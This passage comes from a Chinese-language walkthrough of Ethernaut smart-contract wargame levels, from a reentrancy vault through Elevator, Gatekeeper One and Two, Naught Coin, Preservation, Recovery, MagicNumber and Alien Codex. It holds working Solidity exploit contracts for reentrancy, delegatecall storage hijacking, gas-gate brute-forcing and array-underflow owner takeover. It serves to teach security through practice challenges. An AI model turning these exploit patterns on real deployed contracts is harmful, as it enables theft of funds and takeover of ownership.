uint256 newBalance);<br><br>    mapping(address =&gt; uint256) public balances;<br>    uint256 public totalDeposited;<br>    address public owner;<br>  <br>    constructor() payable &#123;<br>        require(msg.value == 1 ether,&quot;money&quot;);<br>        owner = msg.sender;<br>    &#125;<br><br>    function deposit() external payable &#123;<br>        require(msg.value &gt; 0, &quot;Deposit amount must be greater than 0&quot;);<br>        balances[msg.sender] += msg.value;<br>        totalDeposited += msg.value;<br>        emit Deposit(msg.sender, msg.value);<br>        emit BalanceChange(msg.sender, balances[msg.sender]);<br>    &#125;<br> <br>    function withdraw(uint256 _amount) external &#123;<br>        require(_amount &gt; 0, &quot;Withdrawal amount must be greater than 0&quot;);<br>        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);<br>        require(msg.sender == owner, &quot;Only the owner can withdraw&quot;);<br>        (bool sent, ) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);<br>        balances[msg.sender] -= _amount;<br>        totalDeposited -= _amount;<br>        require(sent, &quot;Failed to send Ether&quot;);<br>        emit Withdrawal(msg.sender, _amount);<br>        emit BalanceChange(msg.sender, balances[msg.sender]);<br>    &#125;<br><br>    function getBalance(address account) external view returns (uint256) &#123;<br>        return balances[account];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack&#123;<br>AdvancedVault add;<br>constructor(AdvancedVault _add) public &#123;<br>add = _add;<br>&#125;<br>           <br>function hack() external payable&#123;<br>add.deposit&#123;value: 1 ether&#125;();<br>add.withdraw(1 ether);<br>&#125;<br><br>function kill() external&#123;<br>selfdestruct(payable(msg.sender));<br>&#125;<br><br>fallback() external payable &#123; <br>if(address(add).balance!=0)&#123;<br>add.withdraw(1 ether);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11. Elevator"></a>11. Elevator</h2><h3 id="条件：让电梯达到大楼顶部"><a href="#条件：让电梯达到大楼顶部" class="headerlink" title="条件：让电梯达到大楼顶部"></a>条件：让电梯达到大楼顶部</h3><p>即：让 top 为 true</p><p>要满足：在 if 中 <code>building.isLastFloor</code> 的返回值为 false，后续再调用 <code>building.isLastFloor</code>，返回值为 true</p><p>根据提示，我们不能让合约运行它期待的 Building 接口中的 <code>isLastFloor</code> 函数</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract BuildingImpl &#123;<br>    Elevator public elevator;<br>    uint256 public count = 0;<br>    constructor(Elevator _elevator) &#123;<br>        elevator = _elevator;<br>    &#125;<br><br>    function goToTop() public &#123;<br>        elevator.goTo(1);<br>       require(elevator.top());<br>    &#125;<br><br>    function isLastFloor(uint256 _floor) public returns (bool) &#123;<br>        count++;<br>        return count &gt; 1;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>elevator</code> 会调用来自 <code>msg.sender</code> (也就是这个合约的地址) 的 <code>isLastFloor</code>，第一次为 <code>false</code>，第二次为 <code>true</code>。</p><h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12. Privacy"></a>12. Privacy</h2><p>见 <code>09. Vault</code>。具体插槽分布如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs slots">slot0: bool locked(4B)<br>slot1: uint256 ID(32B)<br>slot2: uint8 flattening(1B) + uint8 denomination(1B) + uint16 awkwardness(2B)<br>slot3: bytes32 data[0](32B)<br>slot4: bytes32 data[1](32B)<br>slot5: bytes32 data[2](32B)<br></code></pre></td></tr></table></figure><p>通过 <code>web3.eth.getStorageAt(&quot;合约地址&quot;, 5)</code> 获取 <code>data[2]</code>，再取前16位。</p><h2 id="13-GatekeeperOne"><a href="#13-GatekeeperOne" class="headerlink" title="13.GatekeeperOne"></a>13.GatekeeperOne</h2><p>显然要通过3个<code>modifier</code>。</p><ol><li>新建一个合约，在新建的合约里调用 <code>enter()</code> 就行了（<code>msg.sender</code> 为新合约的地址）。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity"> modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><p>要求剩余的 <code>gas</code> 是 8191 的倍数。</p><p>我们可以发送时指定一下 <code>gas</code>：<code>&#123;gas: 8191 * 5 + _gas&#125;</code>，然后挨个试。</p><p>网上的攻略说可以用脚本，这个尝试没成功，回头再试试。</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateTwo() &#123;<br>    require(gasleft() % 8191 == 0);<br>    _;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><p>简化一下：</p><p>首先看最严格的第三条，要求 <code>_gateKey</code> 的后32位与钱包地址后16位相同，显然可以得出，<code>_gatekey64_32 = 0x_ _ _ _823d</code>。</p><p>然后看第一条，要求 <code>_gateKey</code> 的后32位与后16位的值相同，显然，后32位中的前16位必须为0，<code>_gatekey64_32 = 0x0000823d</code>，</p><p><code>_gatekey64 = 0x_ _ _ _ _ _ _ _0000823d</code>。</p><p>最后看第二条，后32位与后64位不相等。只要一大串横线上的数不全为0即可。</p><p>综上，<code>_gateKey = 0x _ _ _ _ _ _ _ _ 0000 + 钱包地址后4位(16进制)</code>，且横线上不全为0。</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateThree(bytes8 _gateKey) &#123;<br>        uint64 _gatekey64 = uint64(_gateKey);<br>        uint32 _gatekey64_32 = uint32(_gatekey64);  <br>        require(_gatekey64_32 == uint16(_gatekey64));   <br>        require(_gatekey64_32 != _gatekey64);  <br>        require(_gatekey64_32 == uint16(uint160(tx.origin)));<br>        _;<br>    &#125;<br></code></pre></td></tr></table></figure><p>通过合约：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass &#123;<br>    GatekeeperOne gatekeeper;<br>        <br>    constructor(GatekeeperOne _gatekeeper) &#123;<br>        gatekeeper = _gatekeeper;<br>    &#125;<br><br>// _gas = 256<br>    function register(uint256 _gas) public returns(bool)&#123;<br>        bytes8 _gateKey = bytes8(uint64(0x00000001000082d3));<br>        return gatekeeper.enter&#123;gas: 8191 * 5 + _gas&#125;(_gateKey);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14. Gatekeeper Two"></a>14. Gatekeeper Two</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="1-内联汇编（assembly）"><a href="#1-内联汇编（assembly）" class="headerlink" title="1. 内联汇编（assembly）"></a>1. 内联汇编（<code>assembly</code>）</h4><p>具体逻辑见：<a href="https://learnblockchain.cn/article/675#%E6%B1%87%E7%BC%96%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D">Solidity 中编写内联汇编(assembly)的那些事[译]</a></p><p>一些操作见：<a href="https://docs.soliditylang.org/en/v0.6.2/yul.html#evm-dialect">EVM Dialect</a></p><h4 id="2-异或运算"><a href="#2-异或运算" class="headerlink" title="2. 异或运算"></a>2. 异或运算</h4><p>对两个二进制数值的每一位，两个输入值不同时结果为真（1），相同时结果为假（0）。</p><p>这里用的是异或运算的可逆性，即：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span> ^ <span class="hljs-selector-tag">b</span> = c<br><span class="hljs-selector-tag">a</span> = <span class="hljs-selector-tag">b</span> ^ c<br><span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">a</span> ^ c<br></code></pre></td></tr></table></figure><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>通过3个 <code>modifier</code>，注册成为 <code>entrant</code>。</p><h4 id="1-GateOne"><a href="#1-GateOne" class="headerlink" title="1. GateOne"></a>1. GateOne</h4><p>很简单，写一个合约，用它去调用 <code>GatekeeperTwo</code>。(<code>msg.sender</code>= 写的合约地址，<code>tx.origin</code> = 你的钱包地址)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity"> modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-GateTwo"><a href="#2-GateTwo" class="headerlink" title="2. GateTwo"></a>2. GateTwo</h4><p>显然，要让 <code>caller()</code> （<code>msg.sender</code> 的底层）的合约代码大小为0。</p><p>由于 <code>excodesize(addr)</code> 不计算合约 <code>constructor</code> 中的代码，因此要在构造函数中调用 <code>enter</code>。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateTwo() &#123;<br>    uint256 x;<br>    assembly &#123;<br>        x := extcodesize(caller())<br>    &#125;<br>    require(x == 0);<br>    _;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-GateThree"><a href="#3-GateThree" class="headerlink" title="3. GateThree"></a>3. GateThree</h4><p>显然，<code>_gateKey = bytes8( uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max )</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">modifier</span> <span class="hljs-function"><span class="hljs-title">gateThree</span>(<span class="hljs-variable">bytes8</span> <span class="hljs-variable">_gateKey</span>) &#123;</span><br><span class="hljs-function">    <span class="hljs-title">require</span>(<span class="hljs-title">uint64</span>(<span class="hljs-title">bytes8</span>(<span class="hljs-title">keccak256</span>(<span class="hljs-variable">abi.encodePacked</span>(<span class="hljs-variable">msg.<span class="hljs-class">sender</span></span>)))) ^ <span class="hljs-title">uint64</span>(<span class="hljs-variable">_gateKey</span>) == <span class="hljs-title">type</span>(<span class="hljs-variable">uint64</span>).max);</span><br><span class="hljs-function">    <span class="hljs-variable">_</span>;</span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass&#123;<br>    GatekeeperTwo gatekeeperTwo;<br>    bytes8 key;<br><br>    constructor(GatekeeperTwo _gatekeeperTwo) &#123;<br>        gatekeeperTwo = _gatekeeperTwo;<br>        key = bytes8( uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max );<br>        _gatekeeperTwo.enter(key);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15. Naught Coin"></a>15. Naught Coin</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>清空 player 的余额，基于 OpenZeppelin 的 ERC20 实现。</p><p>由于 <code>transfer</code> 不能用，因此需要授权一定的额度给 A，让 A去转出。</p><h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><ol><li><p>手动<br>自己给自己 <code>approve</code> 足够的限额，用 <code>transferFrom</code> 把自己的余额转给任意地址。</p></li><li><p>通过合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract turnEmpty&#123;<br>    NaughtCoin naughtCoin;<br>    constructor(NaughtCoin _naughtCoin)&#123;<br>        naughtCoin = _naughtCoin;<br>    &#125;<br><br>    function spendMoney() public &#123;<br>        address _from = tx.origin;<br>        address _to = address(this);<br>        uint256 _value = naughtCoin.balanceOf(_from);<br>        naughtCoin.transferFrom(_from, _to, _value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16. Preservation"></a>16. Preservation</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>未发现可以更改 <code>owner</code> 的代码。</p><p>注意到 <code>SetFirstTime</code> 函数中，<code>delegatecall</code> 调用了下方 <code>LibraryContract</code> 合约中的函数。由于 <code>delegatecall</code> 使用的是原来的上下文，更改的数值由原来的 <code>storedTime</code> 变成了 <code>address public timeZone1Library</code>。因此，可以将它改成我们自己合约的地址，并再次据此更改 <code>owner</code>。</p><h3 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass&#123;<br>    address public timeZone1Library;<br>    address public timeZone2Library;<br>    address public owner;<br>    uint256 storedTime;<br>    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br>    <br>    Preservation preservation;<br><br>    constructor(Preservation _preservation) &#123;<br>        preservation = _preservation;<br>    &#125;<br><br><br>    function changeFirstVar() public &#123;<br>        preservation.setFirstTime( uint256(uint160(address(this))) );<br>    &#125;<br><br>    function setTime(uint256 ) public &#123;<br>        owner = tx.origin;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先调用 <code>changeFirstVar</code>，在调用原合约的 <code>setFirstTime()</code>，参数随便写。</p><h2 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17. Recovery"></a>17. Recovery</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>此处中译漏了 <code>0.001ETH</code>。显然，移除 <code>0.001ETH</code> 只需调用 <code>destroy()</code> 函数。因此关键是获取合约的地址。</p><p>通过普通的 <code>create</code> 创造的合约地址参考：<a href="https://learnblockchain.cn/article/88">以太坊合约地址是怎么计算出来的?</a></p><p>但其中 <code>solidity</code> 部分代码不完整，修改如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">address nonce0 = address(<br>uint160(uint256(keccak256(<br>abi.encodePacked(bytes1(0xd6), bytes1(0x94), factory, bytes1(0x80))<br>)))<br>);<br>address nonce1 = address(<br>    uint160(uint256(keccak256(<br>    abi.encodePacked(bytes1(0xd6), bytes1(0x94), factory, bytes1(0x01))<br>    )))<br>);<br></code></pre></td></tr></table></figure><p>或直接看英文原文：<a href="https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed">How is the address of an Ethereum contract computed?</a></p><h3 id="实现-4"><a href="#实现-4" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass &#123;<br>    function recover(address factory) public pure returns(address[2] memory addr) &#123;<br>        address nonce0 = address(<br>            uint160(uint256(keccak256(<br>                abi.encodePacked(bytes1(0xd6), bytes1(0x94), factory, bytes1(0x80))<br>            )))<br>        );<br>        address nonce1 = address(<br>            uint160(uint256(keccak256(<br>                abi.encodePacked(bytes1(0xd6), bytes1(0x94), factory, bytes1(0x01))<br>            )))<br>        );<br>        addr[0] = nonce0;<br>        addr[1] = nonce1;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分别尝试 <code>nonce0</code> 和 <code>nonce1</code> 算出来的地址，发现 <code>nonce1</code> 处的是真正的合约。</p><h2 id="18-MagicNumber"><a href="#18-MagicNumber" class="headerlink" title="18. MagicNumber"></a>18. MagicNumber</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>由于 <code>solver</code> 的代码必须小于 10B，这太小了，我们只能采用原始的 EVM 操作码创建这样的合约。</p><p>首先要实现直接返回42这一功能，具体如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs opcodes">PUSH1 0x2a<br>PUSH0<br>MSTORE<br>PUSH1 0x20<br>PUSH0<br>RETURN<br></code></pre></td></tr></table></figure><p>它的 bytecode 是：<code>602a5f5260205ff3</code>。</p><p>接下来就要编写 <code>initcode</code> 用于返回最终的合约字节码（就是上面那个）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs opcodes">PUSH8 0x602a5f5260205ff3<br>PUSH0<br>MSTORE<br>PUSH1 0x0a<br>PUSH1 0x18<br>RETURN<br></code></pre></td></tr></table></figure></p><p>它的 bytecode 是：<code>67602a5f5260205ff35f52600a6018f3</code>。</p><p>关于 solidity 内存：参考<a href="https://learnblockchain.cn/docs/solidity/assembly.html#id2">Solidity 中的约定</a></p><blockquote><p>Solidity 以以下方式管理内存。在内存中的位置 <code>0x40</code> 有一个“自由内存指针”。 如果你想分配内存，请使用从该指针指向的位置开始的内存并变更日志它。 没有保证内存之前没有被使用，因此你不能假设其内容为零字节。 没有内置机制来释放或释放已分配的内存。 以下是你可以用来分配内存的汇编代码片段，遵循上述过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function allocate(length) -&gt; pos &#123;<br>  pos := mload(0x40)<br>  mstore(0x40, add(pos, length))<br>&#125;<br></code></pre></td></tr></table></figure><p>Solidity 中内存数组的元素始终占用 32 字节的倍数（即使对于 <code>bytes1[]</code> 也是如此，但对于 <code>bytes</code> 和 <code>string</code> 则不是）。 多维内存数组是指向内存数组的指针。动态数组的长度存储在数组的第一个槽中，后面是数组元素。</p></blockquote><p>关于 Yul，参考：<a href="https://docs.soliditylang.org/en/v0.6.2/yul.html#evm-dialect">EVM Dialect</a></p><p>即：</p><ol><li>向内存中存数据时，应从 0x40 处指针所指的位置开始存</li><li>每次存的字节数应是 32B 的倍数（在 EVM Dialect 的 <code>mstore</code> 中介绍：<code>mem[p…(p+32)) := v</code> 也可以看出来）</li><li>通过 <code>create(value, offset, size)</code> 可以创建新合约，并返回它的地址</li></ol><p>据此，我们有如下内联汇编代码：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">assembly&#123;<br>let pos := <span class="hljs-built_in">mload</span>(<span class="hljs-number">0</span>x40)<br>// 原来<span class="hljs-number">16</span><span class="hljs-built_in">B</span>(<span class="hljs-number">0</span>x10B)，左移<span class="hljs-number">16</span><span class="hljs-built_in">B</span>(<span class="hljs-number">128</span>b =&gt; <span class="hljs-number">0</span>x80b )补齐 <span class="hljs-number">32</span>B<br><span class="hljs-built_in">mstore</span>( pos, <span class="hljs-built_in">shl</span>(<span class="hljs-number">0</span>x80, <span class="hljs-number">0</span>x67602a5f5260205ff35f52600a6018f3) )<br>addr := <span class="hljs-built_in">create</span>(<span class="hljs-number">0</span>, pos, <span class="hljs-number">0</span>x10)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="实现-5"><a href="#实现-5" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract MagicNum &#123;<br>    address public solver;<br><br>    constructor() &#123;&#125;<br><br>    function setSolver(address _solver) public &#123;<br>        solver = _solver;<br>    &#125;<br><br>    /*<br>    ____________/\\\_______/\\\\\\\\\_____        <br>     __________/\\\\\_____/\\\///////\\\___       <br>      ________/\\\/\\\____\///______\//\\\__      <br>       ______/\\\/\/\\\______________/\\\/___     <br>        ____/\\\/__\/\\\___________/\\\//_____    <br>         __/\\\\\\\\\\\\\\\\_____/\\\//________   <br>          _\///////////\\\//____/\\\/___________  <br>           ___________\/\\\_____/\\\\\\\\\\\\\\\_ <br>            ___________\///_____\///////////////__<br>    */<br>&#125;<br><br>contract pass &#123;<br>    constructor(MagicNum _magicNum) &#123;<br>        MagicNum magicNum = _magicNum;<br>        address solver;<br>        assembly&#123;<br>        let pos := mload(0x40)<br>        // 原来16B(0x10B)，左移16B(128b =&gt; 0x80b )补齐 32B<br>        mstore( pos, shl(0x80, 0x67602a5f5260205ff35f52600a6018f3) )<br>        solver := create(0, pos, 0x10)<br>        &#125;<br>        require(solver != address(0));<br>        magicNum.setSolver(solver);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19. Alien Codex"></a>19. Alien Codex</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>未发现 <code>owner</code> 改变的函数。猜测 <code>import</code> 了 <code>openZepplin</code> 的 <code>ownerable.sol</code> ，自带第一个状态变量 <code>owner</code>。猜测要通过插槽实现。</p><blockquote><p>Solidity v0.8.0 重大变更</p><ul><li><p>算术运算在下溢和上溢时会回退。你可以使用 <code>unchecked &#123; ... &#125;</code> 来使用之前的环绕行为。</p><p>溢出检查非常常见，因此我们将其设为默认，以提高代码的可读性，即使这会略微增加 gas 成本。</p></li></ul><p>Solidity v0.6.0 重大变更</p><ul><li>数组的 <code>length</code> 成员访问现在始终是只读的，即使对于存储数组。通过将新值分配给其长度不再可能调整存储数组的大小。请使用 <code>push()</code>, <code>push(value)</code> 或 <code>pop()</code>，或者分配一个完整的数组，这当然会覆盖现有内容。 这样做的原因是为了防止巨型存储数组的存储冲突。</li></ul></blockquote><p>由于 <code>^0.5.0</code> 时下溢不检查，通过 <code>retract()</code> 函数使数组长度变为 $ 2^{256}-1$，这使得它覆盖了全部的插槽（共 $2^{256}$ 个），部分位置就不得不与前面的插槽共用一个位置。我们只要计算那个地方。</p><p>动态数组在 <code>solidity</code> 内存中的存储方式见：<a href="https://github.com/WTFAcademy/WTF-Solidity-Internals/blob/master/tutorials/02_MappingStorage/readme.md">WTF Solidity 内部标准: 02. 映射和动态数组的存储布局</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">slot <span class="hljs-number">0</span><span class="hljs-selector-tag">address</span> <span class="hljs-built_in">owner</span>(<span class="hljs-number">20</span>B)bool <span class="hljs-built_in">contact</span>(<span class="hljs-number">1</span>B)<br>slot <span class="hljs-number">1</span>  codex 数组的长度<br><br>···<br>n = <span class="hljs-built_in">keccak256</span>(<span class="hljs-number">1</span>)<br>slot n codex<span class="hljs-selector-attr">[0]</span>(<span class="hljs-number">32</span>B)<br>slot n+<span class="hljs-number">1</span>codex<span class="hljs-selector-attr">[1]</span><br>···<br>slot <span class="hljs-selector-tag">i</span>codex<span class="hljs-selector-attr">[i-n]</span><br>···<br>slot n+<span class="hljs-number">2</span>^<span class="hljs-number">256</span>-<span class="hljs-number">1</span>codex<span class="hljs-selector-attr">[2^256-1]</span> <br></code></pre></td></tr></table></figure><p>所以，<code>codex[-n]</code> 与 <code>owner</code> 共享插槽。我们可以更改 <code>codex[-n]</code> 来实现对 <code>owner</code> 的更改。</p><h3 id="实现-6"><a href="#实现-6" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IAlienCodex &#123;<br>    function makeContact() external;<br>    function record(bytes32 _content) external;<br>    function retract() external;<br>    function revise(uint256 i, bytes32 _content) external;<br>&#125;<br><br>contract pass &#123;<br>    AlienCodex alienCodex;<br>    constructor(AlienCodex _alienCodex) public &#123;<br>        alienCodex = _alienCodex;<br>    &#125;<br><br>    function changeOwner() public &#123;<br>        alienCodex.makeContact();<br>        alienCodex.retract();<br>        uint256 place = uint256(keccak256(abi.encode(1)));<br>        alienCodex.revise( -place, bytes32(uint256(tx.origin)) );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20. Denial"></a>20. Denial</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>要求在调用 <code>withdraw()</code> 时，仅向 <code>partner</code> 